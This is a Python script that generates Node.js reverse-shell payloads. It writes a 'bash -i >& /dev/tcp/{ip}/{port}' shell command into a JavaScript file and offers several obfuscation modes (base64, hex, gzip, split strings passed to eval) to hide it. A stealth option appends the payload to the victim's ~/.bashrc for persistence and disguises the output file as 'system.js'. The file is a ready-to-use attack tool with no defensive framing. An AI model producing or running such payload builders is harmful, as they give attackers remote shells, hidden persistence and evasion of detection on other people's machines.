import os
import random
import string
import base64

def random_comment_js():
    return "// " + ''.join(random.choices(string.ascii_letters, k=10))

def split_string_js(s, chunk=10):
    parts = [s[i:i+chunk] for i in range(0, len(s), chunk)]
    var_names = [''.join(random.choices(string.ascii_lowercase, k=3)) for _ in parts]
    code = ""
    for var, part in zip(var_names, parts):
        code += f"let {var} = '{part}';\n"
    concat = ' + '.join(var_names)
    code += f"let cmd = {concat};\n"
    code += "eval(cmd);"
    return code

def generate_manual(ip, port, obfuscation="0", stealth=False):
    # Node.js reverse shell (standard)
    payload = f"""require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1');"""
    
    if obfuscation == "0":
        final = payload
    elif obfuscation == "1":  # Base64
        encoded = base64.b64encode(payload.encode()).decode()
        final = f"eval(Buffer.from('{encoded}', 'base64').toString())"
    elif obfuscation == "2":  # Base64 + Hex
        b64 = base64.b64encode(payload.encode()).decode()
        hexed = b64.encode().hex()
        final = f"let h='{hexed}';let b=Buffer.from(h,'hex').toString();eval(Buffer.from(b,'base64').toString())"
    elif obfuscation == "3":  # gzip + Base64 (needs zlib)
        import gzip
        compressed = gzip.compress(payload.encode())
        b64_comp = base64.b64encode(compressed).decode()
        final = f"const zlib = require('zlib');let c='{b64_comp}';let d=Buffer.from(c,'base64');zlib.gunzip(d,(e,r)=>{{eval(r.toString())}});"
    elif obfuscation == "4":  # SUPER: random comments + string splitting
        comments = '\n'.join([random_comment_js() for _ in range(3)])
        split_code = split_string_js(payload)
        final = f"{comments}\n{split_code}"
    else:
        final = payload

    # Persistence: add to .bashrc or similar (if node is in path)
    if stealth:
        pers = f"\n// Persistence: add to ~/.bashrc\nrequire('fs').appendFileSync(process.env.HOME+'/.bashrc', '{final}\\n');"
        final += pers

    os.makedirs("output", exist_ok=True)
    filename = "payload.js"
    if stealth:
        filename = "system.js"
    with open(os.path.join("output", filename), "w") as f:
        f.write(final)
    print(f"[+] JavaScript (Node.js) payload saved to output/{filename}")